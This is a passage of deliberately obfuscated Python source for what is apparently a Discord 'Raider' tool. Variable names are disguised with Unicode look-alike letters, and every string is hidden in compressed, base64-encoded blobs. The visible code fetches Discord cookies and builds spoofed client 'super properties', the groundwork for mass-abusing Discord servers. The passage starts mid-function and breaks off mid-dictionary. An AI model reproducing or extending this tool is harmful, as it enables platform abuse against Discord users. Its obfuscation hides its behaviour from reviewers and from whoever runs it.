        𝗿𝗲𝙨𝘱𝗼𝗻𝘴𝙚 = __𝘪𝗺𝙥𝘰𝘳𝙩__(𝘭𝘔𝗜𝗜𝗠𝙡𝘔𝙉𝘐𝙄𝙉𝘔𝙡𝙡𝘐𝘔𝘭𝗠𝘭𝙄𝙈𝘐𝘔𝙄𝗡𝘔𝗜𝙡𝗹𝗹𝗡𝙡[𝙧𝙤𝘂𝙣𝗱(𝙖𝗯𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝙤𝙧𝘵__(𝘭𝗠𝗜𝗜𝗠𝙡𝘔𝙉𝘐𝙄𝘕𝗠𝘭𝗹𝗜𝗠𝗹𝗠𝙡𝗜𝗠𝘐𝘔𝗜𝗡𝗠𝗜𝘭𝘭𝘭𝘕𝙡[𝗿𝙤𝙪𝘯𝗱(𝙖𝙗𝙨(0.47634343545373103 + 0.8792593084523684j))]).decompress(b'x\xda\x0b7.\xb1L564O\x0b\xb4\xb5\x05\x00\x16\xe2\x03i')).decode().format(𝗙𝗼𝘳𝗲.LIGHTCYAN_EX, 𝘵𝘦𝘹𝙩, 𝗙𝙤𝙧𝙚.RESET)
        if 𝗮𝙨𝗸:
            𝙧𝙚𝙨𝗽𝗼𝗻𝙨𝗲 += __𝙞𝗺𝗽𝙤𝘳𝘁__(𝘭𝙈𝘐𝘐𝘔𝙡𝘔𝗡𝗜𝘐𝙉𝙈𝙡𝘭𝙄𝘔𝙡𝘔𝘭𝘐𝗠𝙄𝘔𝗜𝙉𝘔𝗜𝘭𝗹𝙡𝗡𝙡[𝗿𝘰𝘶𝙣𝗱(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝘱𝙤𝗿𝘵__(𝙡𝗠𝗜𝘐𝗠𝙡𝙈𝘕𝙄𝙄𝘕𝗠𝗹𝙡𝗜𝗠𝗹𝘔𝗹𝗜𝗠𝘐𝘔𝗜𝙉𝗠𝘐𝗹𝘭𝗹𝙉𝙡[𝙧𝗼𝙪𝙣𝙙(𝗮𝗯𝙨(0.02945909892836507 + 0.9995659865613319j))]).decompress(b'x\xda\x0b\xa8t2O\x0b\xce0\xf512)H56H\x07\x00*\xee\x04\xea')).decode().format(𝘍𝙤𝗿𝙚.LIGHTBLACK_EX, 𝗙𝘰𝙧𝘦.RESET)
        else:
            𝗿𝗲𝘴𝙥𝘰𝙣𝙨𝘦 += __𝘪𝙢𝗽𝙤𝘳𝘵__(𝗹𝘔𝙄𝘐𝗠𝙡𝗠𝗡𝙄𝗜𝙉𝗠𝘭𝗹𝗜𝘔𝘭𝘔𝗹𝙄𝘔𝗜𝘔𝘐𝙉𝗠𝗜𝘭𝗹𝘭𝘕𝘭[𝗿𝗼𝘶𝙣𝘥(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝙤𝙧𝘁__(𝙡𝙈𝙄𝗜𝗠𝙡𝗠𝘕𝗜𝗜𝘕𝙈𝗹𝘭𝙄𝙈𝗹𝘔𝗹𝘐𝘔𝗜𝘔𝘐𝗡𝗠𝗜𝘭𝘭𝗹𝙉𝗹[𝙧𝙤𝙪𝘯𝗱(𝗮𝘣𝘀(0.6243197849377232 + 0.7811688717142504j))]).decompress(b'x\xda\x8b\x08\xc9O\x07\x00\x03\xa5\x01\x83')).decode().format()
        return 𝘳𝙚𝘀𝘱𝘰𝘯𝘀𝘦
𝙘𝘰𝙣𝘴𝘰𝗹𝗲 = 𝙍𝗲𝘯𝙙𝗲𝘳()

class Raider:

    def __init__(self):
        𝘴𝙚𝘁𝘢𝘁𝘁𝗿(𝘴𝙚𝙡𝙛, 'cookies', 𝙨𝙚𝙡𝙛.get_discord_cookies())
        𝘴𝗲𝘁𝘢𝘵𝙩𝙧(𝘀𝘦𝙡𝗳, 'props', 𝙨𝙚𝗹𝗳.super_properties())

    def get_discord_cookies(self):
        try:
            𝘳𝙚𝘀𝙥𝗼𝘯𝘀𝗲 = 𝙧𝘦𝘲𝙪𝙚𝘀𝘁𝘀.get(__𝗶𝘮𝗽𝘰𝗿𝙩__(𝙡𝙈𝙄𝘐𝙈𝙡𝗠𝗡𝙄𝘐𝘕𝗠𝙡𝙡𝘐𝗠𝘭𝗠𝘭𝗜𝙈𝙄𝙈𝙄𝙉𝗠𝘐𝗹𝘭𝗹𝙉𝗹[𝘳𝙤𝘂𝙣𝙙(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝘱𝘰𝗿𝙩__(𝙡𝙈𝘐𝙄𝘔𝘭𝘔𝗡𝙄𝙄𝗡𝘔𝘭𝘭𝙄𝙈𝗹𝗠𝙡𝘐𝙈𝙄𝗠𝙄𝙉𝗠𝙄𝗹𝗹𝙡𝗡𝙡[𝗿𝗼𝘂𝙣𝙙(𝘢𝙗𝙨(0.39952284654721903 + 0.9167232379986924j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb4\xb5\x05\x00\x83%\t(')).decode())
            match 𝙧𝗲𝘀𝘱𝘰𝘯𝙨𝗲.status_code:
                case 𝗿𝗼𝙪𝙣𝘥(𝗮𝗯𝘴(166.3080443638738 + 111.09290877397974j)):
                    return __𝗶𝙢𝗽𝗼𝗿𝙩__(𝗹𝙈𝘐𝗜𝙈𝘭𝙈𝗡𝗜𝘐𝙉𝙈𝗹𝙡𝘐𝘔𝗹𝘔𝙡𝗜𝗠𝙄𝙈𝙄𝗡𝙈𝘐𝙡𝗹𝗹𝘕𝗹[𝘳𝙤𝘂𝘯𝙙(𝙖𝗯𝘀(0.0 + 0j))]).b64decode(__𝙞𝙢𝙥𝗼𝗿𝘁__(𝗹𝙈𝘐𝘐𝗠𝙡𝘔𝗡𝙄𝘐𝘕𝘔𝙡𝗹𝗜𝙈𝙡𝙈𝗹𝗜𝗠𝗜𝘔𝗜𝘕𝙈𝘐𝙡𝗹𝘭𝗡𝘭[𝗿𝘰𝘶𝗻𝗱(𝙖𝗯𝘴(0.3169047957071015 + 0.9484573529989845j))]).decompress(b'x\xda\xf3\xaft\xb4\x05\x00\x03j\x01G')).decode().join([__𝘪𝙢𝙥𝘰𝘳𝘵__(𝗹𝗠𝗜𝙄𝗠𝗹𝘔𝘕𝙄𝙄𝘕𝘔𝗹𝙡𝘐𝗠𝙡𝗠𝗹𝗜𝘔𝘐𝙈𝙄𝗡𝗠𝗜𝗹𝙡𝙡𝗡𝗹[𝗿𝗼𝘶𝗻𝘥(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝙤𝘳𝙩__(𝙡𝙈𝘐𝘐𝙈𝘭𝙈𝙉𝙄𝙄𝙉𝙈𝘭𝗹𝙄𝘔𝙡𝗠𝙡𝗜𝙈𝙄𝙈𝗜𝗡𝘔𝘐𝙡𝘭𝙡𝙉𝙡[𝘳𝘰𝙪𝗻𝘥(𝗮𝙗𝙨(0.04888769196196563 + 0.9988042819164483j))]).decompress(b'x\xdaK56\xb0L56\xb0\x05\x00\t\x9c\x02\x07')).decode().format(𝗰𝗼𝘰𝙠𝘪𝗲.name, 𝘤𝘰𝗼𝘬𝙞𝘦.value) for 𝙘𝗼𝘰𝙠𝘪𝗲 in 𝘳𝙚𝘴𝘱𝙤𝗻𝙨𝗲.cookies])
                case _:
                    return __𝗶𝘮𝘱𝙤𝙧𝘁__(𝗹𝘔𝙄𝘐𝘔𝙡𝗠𝙉𝘐𝙄𝗡𝘔𝙡𝗹𝗜𝗠𝙡𝗠𝙡𝗜𝘔𝘐𝗠𝘐𝗡𝘔𝗜𝗹𝙡𝗹𝘕𝗹[𝗿𝘰𝘂𝗻𝙙(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝗼𝗿𝘵__(𝗹𝗠𝗜𝗜𝙈𝘭𝗠𝘕𝙄𝗜𝗡𝘔𝘭𝘭𝘐𝗠𝘭𝘔𝘭𝗜𝙈𝙄𝙈𝗜𝘕𝘔𝙄𝗹𝗹𝗹𝙉𝗹[𝘳𝗼𝘶𝗻𝘥(𝙖𝗯𝘴(0.9648601287197514 + 0.2627640234257819j))]).decompress(b'x\xda\x85PM\x8f\x9b0\x10\xfdK\xd8\x81\x03\x87=\x90\x18\x08\x08\x8f\x1708\xf6\x8d@\x17\x18\xc7\xd5J\xdd\x08\xc2\xaf\xaf\xbb\xa7\x1e*\xf58O\xf3>o$\xb6\x9a\x1a;\xa9\x87}\x97\xcd\x83\xe7ihX\xb7A\x9e\x06\xc0\xd2\xdd\xa8~\x15lq@u(r\xb3j\xec-\xc7\xf3"^\xe7\x8f\xdb\t\xfe\xc5\xdd\xff\xc7\xd5G\xedo\xb0\xc0\xe6\x08\\\xb3\x18\xa9\t\x1c\xcd\xa2Uz2\xaet\x1a91\xd8\xaf\x1c\xcb\x15XB\xb4+\xad\x90|7\xaeA\x8d\xe3K\x1f\xc5np&\x1a\x0b\xca\xa9\xa6\\\xd6\x1bg\xbf\xe6\x1b\x89\x8f\xe9Z~\x8ey\xffq\xff\xced\xfdO\x12\t\xd9,\x95\xec\x08\xc8\xee\x0b\xf2\xec\xc1W\xb2\x80,\xa2J\xa6\x91\xc9}W\xd5\x85Z\xce\x01G\xed=x\xc0\xe5\xb7\x16\x9a\x9f%\x19T\x1d\xc31F@a\x11\xaa \x9c\x16\x1bW\xfa\xc5U\x8f\x1c3\x14y\x89Z\xda\x1d0\t\xc1i\x9fF\x1fBy\x95K\xe01\x1bx\x9f\x1d\xd8\xb8\xf9\xbd\xd0<b\xbc\xe7\xfd2\xba\xec\xa9i\x17\x0f\xdd\xbeN\x98\x15\xa2\x8fmk\xb3vp\xe6TY\xf2j\xafgyW{0\x1dS\xfa#\x9f\xb7\xbb\x1b\x9f-\x8d\xe4`\xe3\xeb \xb3\xb2m\xff\xd2\x96IX\xc9\xe4\x8b\xb7\x7f:\xd5\x81\xc1\xfad\xda\xc8o\x9cR\xc3&\x84K\xe4S\xf9\xfd\x98\xb1\xe6\x12l\x15\x16O.u\x04\xac{q\xd9m"y{\xfb\rV\x94\xabK')).decode()
        except 𝙀𝘅𝘤𝗲𝗽𝙩𝗶𝙤𝘯 as e:
            𝘱𝘳𝙞𝗻𝘁(__𝗶𝗺𝙥𝘰𝙧𝙩__(𝗹𝙈𝙄𝙄𝙈𝘭𝗠𝘕𝘐𝙄𝗡𝘔𝗹𝙡𝙄𝘔𝗹𝗠𝙡𝙄𝙈𝗜𝘔𝗜𝙉𝙈𝗜𝗹𝗹𝘭𝘕𝘭[𝗿𝙤𝘶𝘯𝙙(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝙢𝙥𝗼𝗿𝘵__(𝙡𝙈𝘐𝗜𝗠𝘭𝘔𝘕𝙄𝙄𝘕𝗠𝙡𝗹𝘐𝘔𝗹𝘔𝘭𝗜𝙈𝙄𝙈𝗜𝙉𝙈𝘐𝘭𝙡𝙡𝙉𝗹[𝙧𝘰𝙪𝙣𝙙(𝘢𝗯𝘀(0.007705910933202276 + 0.9999703090275678j))]).decompress(b'x\xda\xf3v\r\x0b\x0e\xcd\xcc6\xf3\xf4(\xb1\xf4t\xce\xc8\x8b\x8a\x08J\x8br\xcf\xa9\x8a4\xb2\xac\x8cr\xb3\xccJ2\xb2,J\x0c\x0f\xab\xf2\x0e\xb4\xb5\x05\x00G\xe7\x0e\x87')).decode().format(𝘦))

    def super_properties(self):
        𝗽𝙖𝙮𝙡𝗼𝙖𝙙 = {__𝙞𝘮𝙥𝘰𝘳𝘵__(𝗹𝗠𝗜𝗜𝘔𝗹𝘔𝗡𝙄𝘐𝘕𝘔𝗹𝙡𝗜𝗠𝘭𝙈𝘭𝘐𝙈𝙄𝗠𝙄𝙉𝘔𝗜𝘭𝘭𝘭𝙉𝙡[𝗿𝗼𝘂𝘯𝘥(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝗼𝘳𝙩__(𝙡𝙈𝗜𝘐𝙈𝗹𝙈𝘕𝗜𝙄𝗡𝘔𝙡𝘭𝗜𝙈𝗹𝗠𝗹𝗜𝘔𝙄𝙈𝗜𝗡𝘔𝗜𝗹𝘭𝗹𝘕𝙡[𝘳𝗼𝘶𝗻𝗱(𝙖𝗯𝘀(0.5012865897471831 + 0.8652813154920423j))]).decompress(b'x\xdaK2\xf6\xb5\x05\x00\x02\xfc\x01 ')).decode(): __𝗶𝙢𝗽𝗼𝘳𝘵__(𝗹𝗠𝗜𝗜𝗠𝙡𝗠𝙉𝗜𝗜𝘕𝙈𝙡𝘭𝗜𝗠𝘭𝙈𝗹𝘐𝗠𝘐𝗠𝘐𝗡𝙈𝗜𝘭𝗹𝗹𝘕𝙡[𝙧𝙤𝘂𝘯𝗱(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝘰𝗿𝘁__(𝙡𝗠𝘐𝗜𝗠𝙡𝗠𝗡𝙄𝗜𝗡𝘔𝘭𝗹𝘐𝘔𝙡𝗠𝘭𝗜𝙈𝘐𝘔𝗜𝘕𝗠𝘐𝙡𝘭𝘭𝗡𝗹[𝘳𝗼𝘂𝘯𝗱(𝘢𝙗𝘀(0.4322828046658369 + 0.9017380865807088j))]).decompress(b'x\xda\x0b3\xca)\x8dr\xb74N.\xb7\xb5\x05\x00\x19M\x03\xcb')).decode(), __𝗶𝙢𝙥𝘰𝘳𝙩__(𝘭𝙈𝙄𝙄𝗠𝙡𝗠𝘕𝘐𝗜𝗡𝙈𝗹𝙡𝘐𝗠𝘭𝗠𝗹𝘐𝗠𝗜𝘔𝙄𝘕𝙈𝗜𝘭𝘭𝙡𝘕𝗹[𝗿𝘰𝘶𝘯𝗱(𝗮𝘣𝘴(0.0 + 0j))]).b64decode(__𝘪𝙢𝙥𝗼𝙧𝘵__(𝘭𝙈𝗜𝘐𝗠𝘭𝗠𝙉𝗜𝘐𝘕𝗠𝙡𝙡𝘐𝗠𝗹𝘔𝙡𝘐𝘔𝙄𝗠𝘐𝗡𝙈𝘐𝗹𝗹𝗹𝙉𝘭[𝘳𝗼𝘶𝙣𝘥(𝗮𝙗𝘀(0.6424597660817224 + 0.7663194170619837j))]).decompress(b'x\xda\x8b\xcc\xf3*K1\xf6\xcbIN\xb7\xb5\x05\x00\x1b\xe9\x04\x1d')).decode(): __𝘪𝗺𝘱𝙤𝘳𝙩__(𝘭𝗠𝗜𝙄𝘔𝙡𝘔𝙉𝘐𝘐𝗡𝘔𝗹𝗹𝙄𝗠𝗹𝘔𝙡𝙄𝗠𝘐𝙈𝙄𝙉𝗠𝘐𝘭𝘭𝘭𝗡𝙡[𝘳𝗼𝙪𝙣𝙙(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝗼𝘳𝘁__(𝘭𝗠𝗜𝙄𝙈𝗹𝙈𝗡𝘐𝘐𝗡𝗠𝙡𝘭𝙄𝗠𝗹𝘔𝗹𝗜𝙈𝘐𝙈𝘐𝗡𝗠𝗜𝘭𝗹𝘭𝙉𝗹[𝗿𝗼𝘂𝘯𝗱(𝙖𝙗𝘴(0.8823490262432561 + 0.47059557572036076j))]).decompress(b'x\xda\x0br\xcf\xa9\x8a4\xb2\xac\x8crvrIr\xcf\xc9I\xca\x0b\xb4\x05\x00F\x9b\x06\xbf')).decode(), __𝗶𝘮𝘱𝘰𝘳𝙩__(𝗹𝙈𝘐𝘐𝘔𝘭𝘔𝙉𝗜𝙄𝙉𝗠𝘭𝗹𝗜𝙈𝗹𝙈𝗹𝙄𝗠𝘐𝘔𝙄𝗡𝘔𝗜𝘭𝗹𝗹𝗡𝙡[𝗿𝙤𝘶𝘯𝘥(𝙖𝙗𝘴(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝘰𝘳𝙩__(𝘭𝗠𝙄𝗜𝗠𝗹𝘔𝙉𝘐𝙄𝙉𝙈𝙡𝘭𝙄𝙈𝙡𝗠𝘭𝘐𝗠𝘐𝙈𝙄𝗡𝙈𝗜𝗹𝙡𝗹𝘕𝗹[𝘳𝙤𝘂𝗻𝘥(𝙖𝗯𝘀(0.9641434876462146 + 0.2653814899901528j))]).decompress(b'x\xdaK\xce\r+\x8e\nw\xab\x8a\n\xb3\xccJtw+M\x02\xf2\x01M\x07\x07Y')).decode(): __𝘪𝗺𝙥𝙤𝘳𝘁__(𝗹𝗠𝘐𝗜𝘔𝙡𝘔𝘕𝘐𝘐𝙉𝙈𝗹𝙡𝙄𝗠𝗹𝘔𝗹𝗜𝘔𝘐𝘔𝗜𝗡𝗠𝗜𝙡𝙡𝙡𝗡𝗹[𝘳𝘰𝘂𝗻𝘥(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝘰𝘳𝙩__(𝗹𝗠𝗜𝘐𝘔𝘭𝙈𝙉𝘐𝙄𝙉𝗠𝘭𝙡𝗜𝗠𝘭𝙈𝘭𝙄𝘔𝗜𝗠𝘐𝙉𝗠𝙄𝘭𝘭𝙡𝙉𝗹[𝙧𝗼𝘂𝘯𝗱(𝗮𝗯𝘀(0.40109795022324457 + 0.9160351709005018j))]).decompress(b'x\xdaK6\x0e\xca\x88\xcc\xad\xc8\x01\x00\x0c\x80\x02\xfb')).decode(), __𝙞𝗺𝗽𝘰𝗿𝘵__(𝘭𝗠𝘐𝘐𝘔𝙡𝙈𝙉𝙄𝗜𝗡𝙈𝘭𝘭𝘐𝘔𝙡𝗠𝙡𝗜𝘔𝗜𝘔𝗜𝙉𝘔𝗜𝙡𝙡𝗹𝗡𝘭[𝘳𝙤𝙪𝘯𝗱(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝙤𝗿𝘵__(𝘭𝙈𝙄𝗜𝙈𝗹𝗠𝙉𝙄𝘐𝘕𝙈𝘭𝘭𝘐𝘔𝙡𝗠𝘭𝘐𝙈𝗜𝗠𝙄𝗡𝘔𝘐𝘭𝘭𝘭𝙉𝘭[𝘳𝗼𝘶𝘯𝙙(𝗮𝘣𝙨(0.20180856371689748 + 0.9794249862090119j))]).decompress(b'x\xda\x8b4\xaa(\x88\n75\x880\x8e\xcaI\xce\xf3+H22\xb1\x05\x00E/\x06o')).decode(): __𝙞𝙢𝘱𝙤𝗿𝘁__(𝗹𝘔𝙄𝙄𝗠𝗹𝘔𝘕𝙄𝗜𝙉𝘔𝙡𝘭𝙄𝙈𝗹𝗠𝗹𝗜𝙈𝗜𝗠𝘐𝙉𝗠𝙄𝘭𝙡𝙡𝘕𝘭[𝙧𝙤𝘶𝘯𝘥(𝘢𝗯𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝘰𝗿𝘁__(𝙡𝙈𝘐𝘐𝙈𝗹𝗠𝘕𝗜𝗜𝙉𝙈𝘭𝗹𝙄𝗠𝗹𝘔𝙡𝗜𝙈𝘐𝙈𝘐𝙉𝗠𝘐𝙡𝙡𝘭𝘕𝙡[𝙧𝘰𝘂𝗻𝗱(𝘢𝘣𝙨(0.009631809015172244 + 0.9999536130516732j))]).decompress(b'x\xda\xf3\r6)\xf7\xc9\xca.\xf7\rI\xb6\x05\x00\x1a\xbe\x04%')).decode(), __𝙞𝘮𝘱𝗼𝙧𝘵__(𝙡𝗠𝘐𝘐𝙈𝘭𝗠𝙉𝘐𝘐𝘕𝙈𝘭𝙡𝗜𝗠𝙡𝗠𝙡𝗜𝙈𝗜𝙈𝗜𝗡𝘔𝘐𝘭𝗹𝘭𝘕𝘭[𝙧𝘰𝘶𝘯𝘥(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝗽𝗼𝘳𝘵__(𝙡𝙈𝘐𝘐𝙈𝙡𝗠𝘕𝘐𝙄𝙉𝙈𝙡𝙡𝗜𝘔𝘭𝘔𝗹𝘐𝙈𝙄𝙈𝗜𝙉𝙈𝙄𝘭𝘭𝘭𝙉𝗹[𝗿𝙤𝙪𝙣𝙙(𝙖𝘣𝘀(0.24893481954376906 + 0.9685202401698744j))]).decompress(b'x\xdaK2\xf6KK\xc9\r\xabL6\xca)KJ\xb7\xb5\x05\x000[\x05\xa4')).decode(): __𝘪𝗺𝗽𝗼𝘳𝘵__(𝗹𝙈𝙄𝙄𝗠𝘭𝙈𝗡𝙄𝗜𝘕𝙈𝘭𝗹𝗜𝙈𝗹𝙈𝗹𝙄𝘔𝘐𝘔𝗜𝘕𝘔𝙄𝙡𝘭𝙡𝘕𝗹[𝙧𝘰𝘂𝗻𝘥(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝘱𝙤𝘳𝙩__(𝗹𝘔𝙄𝙄𝘔𝙡𝘔𝗡𝙄𝗜𝙉𝗠𝗹𝙡𝙄𝘔𝘭𝘔𝗹𝘐𝙈𝙄𝗠𝗜𝘕𝙈𝘐𝘭𝙡𝗹𝙉𝘭[𝙧𝘰𝙪𝙣𝙙(𝙖𝙗𝙨(0.010319494545035557 + 0.9999467525985246j))]).decompress(b'x\xda\xf3\rq,\xf5u6\xa9\xf0\x0fq4\xf0\x0b\xb4\xb5\x05\x00*$\x04\xc1')).decode(), __𝗶𝙢𝗽𝘰𝙧𝙩__(𝘭𝗠𝙄𝙄𝘔𝗹𝗠𝙉𝗜𝙄𝙉𝙈𝙡𝙡𝙄𝗠𝗹𝙈𝗹𝘐𝙈𝘐𝘔𝗜𝙉𝘔𝗜𝗹𝘭𝘭𝙉𝙡[𝘳𝘰𝘂𝙣𝙙(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝙤𝙧𝙩__(𝙡𝘔𝗜𝙄𝘔𝙡𝘔𝘕𝗜𝙄𝗡𝙈𝙡𝙡𝗜𝙈𝘭𝙈𝙡𝗜𝗠𝙄𝗠𝙄𝙉𝘔𝘐𝗹𝗹𝘭𝗡𝘭[𝙧𝘰𝘂𝘯𝘥(𝙖𝙗𝘴(0.9136465396813432 + 0.4065095331333667j))]).decompress(b'x\xdaK2\xf6K\x8b\x8c\xf0\xcaJt\xb4\xb5\x05\x00\x19s\x03\xcb')).decode(): __𝘪𝗺𝘱𝘰𝗿𝘵__(𝙡𝗠𝙄𝙄𝙈𝗹𝘔𝘕𝗜𝗜𝘕𝘔𝘭𝘭𝙄𝗠𝗹𝙈𝙡𝙄𝘔𝙄𝘔𝗜𝘕𝙈𝙄𝘭𝙡𝙡𝘕𝘭[𝗿𝙤𝙪𝗻𝙙(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(__𝗶𝘮𝘱𝙤𝗿𝘵__(𝘭𝙈𝘐𝙄𝗠𝗹𝙈𝗡𝗜𝗜𝘕𝗠𝙡𝙡𝗜𝙈𝘭𝘔𝘭𝗜𝙈𝙄𝘔𝙄𝙉𝘔𝘐𝗹𝘭𝗹𝘕𝘭[𝗿𝙤𝙪𝙣𝘥(𝗮𝙗𝘀(0.6846884639420417 + 0.7288358576145163j))]).decompress(b'x\xdaKu\x894\x00\x00\x03F\x013')).decode(), __𝗶𝙢𝙥𝙤𝗿𝘁__(𝙡𝘔𝗜𝗜𝗠𝙡𝘔𝙉𝘐𝘐𝘕𝙈𝘭𝗹𝗜𝙈𝘭𝗠𝘭𝘐𝙈𝗜𝙈𝗜𝙉𝘔𝙄𝘭𝗹𝙡𝗡𝘭[𝘳𝗼𝘶𝙣𝙙(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝙤𝗿𝘁__(𝙡𝘔𝙄𝙄𝗠𝙡𝘔𝘕𝙄𝙄𝙉𝙈𝘭𝙡𝘐𝘔𝙡𝘔𝘭𝘐𝙈𝙄𝗠𝗜𝘕𝗠𝙄𝘭𝗹𝗹𝗡𝙡[𝘳𝗼𝘶𝘯𝗱(𝙖𝙗𝘀(0.6879051710244605 + 0.7258005756940454j))]).decompress(b'x\xda\x8b\x8cp*\x8f0r\xab\x8c4J\xb7\x05\x00\x19\xe7\x03\xe3')).decode(): __𝙞𝙢𝙥𝗼𝘳𝙩__(𝘭𝗠𝘐𝘐𝘔𝙡𝘔𝙉𝘐𝙄𝘕𝙈𝙡𝘭𝗜𝗠𝙡𝗠𝗹𝙄𝙈𝘐𝙈𝗜𝙉𝙈𝘐𝘭𝘭𝗹𝘕𝙡[𝘳𝗼𝙪𝘯𝙙(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝙥𝗼𝘳𝙩__(𝘭𝙈𝙄𝘐𝘔𝘭𝘔𝗡𝗜𝙄𝗡𝗠𝘭𝘭𝗜𝘔𝗹𝗠𝗹𝗜𝘔𝘐𝙈𝘐𝗡𝗠𝙄𝗹𝙡𝗹𝙉𝙡[𝗿𝗼𝙪𝙣𝙙(𝗮𝗯𝘀(0.7453931961756833 + 0.6666250693568306j))]).decompress(b'x\xdaK\x0cw\xad\xf2M\xb7\xb5\x05\x00\x0c\x91\x02\xa6')).decode(), __𝙞𝗺𝙥𝙤𝘳𝘁__(𝗹𝗠𝙄𝘐𝙈𝙡𝙈𝘕𝙄𝗜𝘕𝙈𝙡𝘭𝙄𝗠𝘭𝙈𝗹𝘐𝙈𝙄𝙈𝙄𝘕𝘔𝗜𝘭𝘭𝙡𝙉𝘭[𝗿𝘰𝙪𝙣𝘥(𝙖𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝘮𝘱𝗼𝙧𝘁__(𝘭𝙈𝗜𝘐𝙈𝙡𝘔𝙉𝘐𝗜𝘕𝙈𝘭𝗹𝙄𝗠𝗹𝗠𝘭𝙄𝘔𝗜𝗠𝗜𝗡𝗠𝙄𝘭𝘭𝗹𝘕𝗹[𝘳𝗼𝘂𝘯𝗱(𝗮𝘣𝘴(0.30622422027352136 + 0.9519594145329274j))]).decompress(b'x\xdaK6\xce\xa9Jq\x0f+\x890\xaa(\x8b4r+\x8e\n\xb4\xb5\x05\x00J\x83\x06\xd3')).decode(): __𝙞𝘮𝘱𝙤𝙧𝙩__(𝙡𝗠𝙄𝘐𝘔𝗹𝘔𝗡𝗜𝙄𝘕𝘔𝙡𝙡𝘐𝘔𝙡𝙈𝗹𝙄𝗠𝗜𝗠𝙄𝘕𝗠𝘐𝘭𝘭𝗹𝘕𝙡[𝙧𝗼𝘶𝘯𝙙(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(__𝗶𝙢𝙥𝗼𝘳𝘁__(𝗹𝙈𝙄𝗜𝗠𝙡𝗠𝙉𝗜𝗜𝗡𝘔𝗹𝙡𝗜𝗠𝙡𝗠𝗹𝙄𝙈𝗜𝙈𝗜𝗡𝘔𝗜𝙡𝗹𝘭𝘕𝗹[𝙧𝙤𝙪𝘯𝗱(𝘢𝘣𝘀(0.9196649792282537 + 0.39270386550312386j))]).decompress(b'x\xdaKv/\xb7\x05\x00\x03\x90\x01_')).decode(), __𝙞𝘮𝗽𝘰𝙧𝘵__(𝘭𝙈𝘐𝗜𝗠𝙡𝗠𝘕𝘐𝗜𝗡𝘔𝗹𝘭𝗜𝗠𝗹𝘔𝗹𝘐𝙈𝘐𝙈𝗜𝘕𝗠𝙄𝗹𝘭𝘭𝙉𝗹[𝗿𝗼𝙪𝗻𝗱(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝘱𝙤𝙧𝘵__(𝙡𝗠𝙄𝘐𝘔𝙡𝙈𝗡𝗜𝗜𝘕𝗠𝗹𝘭𝙄𝙈𝗹𝗠𝗹𝗜𝘔𝙄𝙈𝘐𝘕𝗠𝘐𝗹𝙡𝘭𝙉𝘭[𝙧𝘰𝘂𝗻𝙙(𝘢𝘣𝘀(0.110860441625237 + 0.993835983692811j))]).decompress(b'x\xda\x8b\xcc\xf3*K1\xf6\xcbI\xce\xb14L6\n\xab\x8c0r\xcb\x8b\n75\x00\x00f\x12\x07\xca')).decode(): __𝘪𝗺𝙥𝙤𝘳𝙩__(𝙡𝗠𝘐𝗜𝘔𝗹𝙈𝗡𝗜𝗜𝙉𝙈𝙡𝗹𝘐𝘔𝗹𝙈𝙡𝗜𝙈𝗜𝘔𝗜𝘕𝗠𝘐𝗹𝙡𝘭𝘕𝘭[𝘳𝘰𝘂𝙣𝗱(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝗼𝘳𝘵__(𝘭𝗠𝙄𝙄𝘔𝘭𝘔𝘕𝘐𝗜𝘕𝗠𝗹𝙡𝙄𝘔𝙡𝙈𝘭𝙄𝙈𝙄𝙈𝗜𝘕𝙈𝙄𝗹𝗹𝙡𝗡𝗹[𝗿𝙤𝘂𝘯𝘥(𝘢𝙗𝘀(0.22125366096259214 + 0.9752162926810904j))]).decompress(b'x\xda=\xcdA\x0f\x82 \x18\x80\xe1\xbf\xa4_\xad\xe9\xc1\x83+u\x14\xd0T@\xeb\xa6\xb8\xa1\xa4\x8b\xcd)\xca\xaf\xaf.]\xdf\xc3\xf3\xb2*<5\xd56?\xca\xc0\xc7:V\xb7\xb43\xedT\xac\xdd\x81(6\xe6\x8a\xb0x!\x97Y\t/\xac\xa9\xce\rJR+\xb3m\x14 \x86\x12F\x0f;\xee\xe8~tt\x88\xdf\xa5\xd7s\xc6\xed\x8c\xb2\xcd4\xc0U\x01B7\x10\x18\x94\x15F\x02]\xe5\x94\xaf\xa4<Z\xac_\x960\xa9r\xe8\xf7\x16\xfc\x11\xbb\xc4\xde\xcf\xbf\xfe\xb5\xd8k!:\xf1Q"\xe6gE=9\x85\x0bvh\xc7\x9a,\x84!\xc5!\x9d\x1e\xf5\xd5\xfc\xbf*\x8a>\xc9\x89CX')).decode(), 